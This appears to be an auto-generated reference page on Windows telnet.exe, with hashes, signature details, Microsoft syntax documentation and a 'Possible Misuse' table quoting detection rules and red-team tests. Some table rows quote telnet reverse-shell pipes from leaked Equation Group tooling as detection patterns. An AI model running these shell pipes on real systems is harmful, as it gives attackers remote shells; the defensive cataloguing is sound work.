﻿---
title: telnet.exe | Microsoft Telnet Client
excerpt: What is telnet.exe?
---

# telnet.exe 

* File Path: `C:\Windows\system32\telnet.exe`
* Description: Microsoft Telnet Client

## Hashes

Type | Hash
-- | --
MD5 | `8EAE1ADEF9BF1A17B152F31C79088A88`
SHA1 | `FE037BB6B345A866586A96D8E7A6EF6A23B4EF4D`
SHA256 | `ABE72A168C332E2FCB493E85290744E7153ECD109A0B5FFD7FABBAAC339C673A`
SHA384 | `49A1D098853F737A530C026903CB8093BD72793C2EA13A73671892D488F13BBADD9C534BDE44B3AB8689AC59194CB232`
SHA512 | `4165E51FB605D3CD5671B0C4AD282A9645B2AE2193D923819C6BE45AE9427AD628488CE5877A69CEAE5ADA4505201B23C30202EE15CBF0FDD8E0CC72E5D95B8F`
SSDEEP | `3072:fR4CNuFPMRjUJdxKPggRqYx7XoQEYvkWEnqq:J4CM1MRQJdxKPggRqW76sAnq`

## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: telnetc.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `telnet.exe` being misused. While `telnet.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [lnx_apt_equationgroup_lnx.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/lnx_apt_equationgroup_lnx.yml) | `- '/bin/telnet locip locport < /dev/console \| /bin/sh'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [lnx_apt_equationgroup_lnx.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/lnx_apt_equationgroup_lnx.yml) | `- '&& telnet * 2>&1 </dev/console'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [lnx_shell_susp_rev_shells.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/lnx_shell_susp_rev_shells.yml) | `- ' \| /bin/bash \| telnet '`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [macos_network_service_scanning.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/macos_network_service_scanning.yml) | `- '/telnet'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [lnx_auditd_network_service_scanning.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/auditd/lnx_auditd_network_service_scanning.yml) | `- '/telnet'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [lnx_network_service_scanning.yml](https://github.com/Neo23x0/sigma/blob/master/rules/linux/process_creation/lnx_network_service_scanning.yml) | `- '/telnet' # could be wget, curl, ssh, many things. basically everything that is able to do network connection. consider fine tuning`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_uac_bypass_via_dism.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_uac_bypass_via_dism.yml) | `- Actions of a legitimate telnet client`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_susp_plink_remote_forward.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_susp_plink_remote_forward.yml) | `Description: 'Command-line SSH, Telnet, and Rlogin client'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_multiple_suspicious_cli.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_multiple_suspicious_cli.yml) | `- telnet.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[malware-ioc](https://github.com/eset/malware-ioc) | [LinuxMooseETrules.txt](https://github.com/eset/malware-ioc/blob/master/moose/LinuxMooseETrules.txt) | `alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"ET TROJAN Possible Linux/Moose Telnet CnC Beacon"; flow:established,to_server; dsize:40; content:"\|0e 00 00 00\|"; offset:4; depth:4; fast_pattern; content:!"\|00\|"; within:1; content:!"\|00\|"; distance:3; within:1; content:"\|00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\|"; distance:4; within:28; content:!"\|00 00 00 00\|"; depth:4; reference:url,welivesecurity.com/wp-content/uploads/2015/05/Dissecting-LinuxMoose.pdf; classtype:trojan-activity; sid:2021149; rev:1;)`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [moose](https://github.com/eset/malware-ioc/blob/master/moose/README.adoc) | `leveraging weak or default usernames and passwords via the Telnet protocol. If`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1046.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md) | Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of adresseses on port 80 to determine if listening. Results will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1046.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md) | telnet #{host} #{port} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1110.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.md) | * Telnet (23/TCP) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1110.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.md) | * Telnet (23/TCP) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1110.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/T1110.004.md) | * Telnet (23/TCP) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1571.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1571/T1571.md) | Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1571.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1571/T1571.md) | Testing uncommonly used port utilizing telnet. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1571.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1571/T1571.md) | telnet #{domain} #{port} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_eqgrp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_eqgrp.yar) | $x5 = "-p DEST_PORT, --dest_port=DEST_PORT defaults: telnet=23, ssh=22 (optional) - Change to LOCAL redirect port" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_eqgrp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_eqgrp.yar) | description = "EQGRP Toolset Firewall - from files ssh.py, telnet.py" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_eqgrp_apr17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_eqgrp_apr17.yar) | $s2 = "Cut and paste the following to the telnet prompt:" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_eqgrp_apr17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_eqgrp_apr17.yar) | description = "Equation Group hack tool leaked by ShadowBrokers- file wrap-telnet.sh" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_eqgrp_apr17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_eqgrp_apr17.yar) | $x2 = "Remote Usage: /bin/telnet locip locport < /dev/console \| /bin/sh\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_fvey_shadowbroker_dec16.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_fvey_shadowbroker_dec16.yar) | $s5 = "bll.telnet" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_fvey_shadowbroker_dec16.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_fvey_shadowbroker_dec16.yar) | $s1 = "/sbin/sh -c (mkdir /tmp/.X11R6; cd /tmp/.X11R6 && telnet" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [generic_anomalies.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/generic_anomalies.yar) | $s1 = "SSH, Telnet and Rlogin client" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | description = "Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s0 = "TELNET [host [port]]" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s2 = "TELNET.EXE" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s14 = "Software\\Microsoft\\Telnet" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | description = "Detects malicious telnet shell" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | description = "Semi-Auto-generated  - file telnet.pl.txt" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | description = "Semi-Auto-generated  - file telnet.cgi.txt" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## telnet

>Applies to: Windows Server 2022, Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012

Communicates with a computer running the telnet server service. Running this command without any parameters, lets you enter the telnet context, as indicated by the telnet prompt (**Microsoft telnet>**). From the telnet prompt, you can use telnet commands to manage the computer running the telnet client.

> [!IMPORTANT]
> You must install the telnet client software before you can run this command. For more information, see [Installing telnet](/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754293(v=ws.10)).

### Syntax

```
telnet [/a] [/e <escapechar>] [/f <filename>] [/l <username>] [/t {vt100 | vt52 | ansi | vtnt}] [<host> [<port>]] [/?]
```

#### Parameters

| Parameter | Description |
|--|--|
| /a | Attempts automatic logon. Same as **/l** option, except that it uses the currently logged on user's name. |
| /e `<escapechar>` | Specifies the escape character used to enter the telnet client prompt. |
| /f `<filename>` | Specifies the file name used for client side logging. |
| /l `<username>` | Specifies the user name to log on with on the remote computer. |
| /t `{vt100 | vt52 | ansi | vtnt}` | Specifies the terminal type. Supported terminal types are **vt100**, **vt52**, **ansi**, and **vtnt**. |
| `<host> [<port>]` | Specifies the hostname or IP address of the remote computer to connect to, and optionally the TCP port to use (default is TCP port 23). |
| /? | Displays help at the command prompt. |

### Examples

To use telnet to connect to the computer running the telnet Server Service at *telnet.microsoft.com*, type:

```
telnet telnet.microsoft.com
```

To use telnet to connect to the computer running the telnet Server Service at *telnet.microsoft.com on TCP port 44* and ro log the session activity in a local file called *telnetlog.txt*, type:

```
telnet /f telnetlog.txt telnet.microsoft.com 44
```

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

- [Installing telnet](/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754293(v=ws.10))

- [telnet Technical Reference](/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754987(v=ws.10))

---



MIT License. Copyright (c) 2020-2021 Strontic.


